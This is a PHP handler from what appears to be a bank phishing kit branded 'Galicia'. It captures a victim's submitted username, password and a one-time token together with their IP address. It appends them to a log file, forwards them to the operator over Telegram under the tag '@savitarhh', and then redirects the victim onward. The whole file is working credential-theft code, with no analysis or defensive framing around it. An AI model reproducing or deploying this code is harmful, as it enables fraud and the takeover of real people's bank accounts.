<?php
error_reporting(0);
include '../config.php';
include './tg.php';
$ip = $_SERVER['REMOTE_ADDR'];
if (isset($_POST['usu'])) {
    $msg  = "➖➖➖➖[ Galicia ]➖➖➖➖\r\n";
    $msg .= "✔️ User : <code>{$_POST['usu']}</code>\r\n";
    $msg .= "✔️ Psswd : <code>{$_POST['pass']}</code>\r\n";
    $msg .= "➖➖➖➖INFO➖➖➖➖\r\n";
    $msg .= "🌐 Client IP : ".$ip."\r\n";
    $msg .= "➖➖➖➖[@savitarhh]➖➖➖➖\r\n\r\n\r\n";
    $save = fopen("../".$txt.".txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    header("location: ../index2.html");
    sendTg($msg, $key, $id);
}
if (isset($_POST['topos'])) {
    $msg  = "➖➖➖➖[ Galicia ]➖➖➖➖\r\n";
    $msg .= "✔️ Token : <code>{$_POST['topos']}</code>\r\n";
    $msg .= "➖➖➖➖INFO➖➖➖➖\r\n";
    $msg .= "🌐 Client IP : ".$ip."\r\n";
    $msg .= "➖➖➖➖[@savitarhh]➖➖➖➖\r\n\r\n\r\n";
    $save = fopen("../".$txt.".txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    header("location: $out");
    sendTg($msg, $key, $id);
}
?>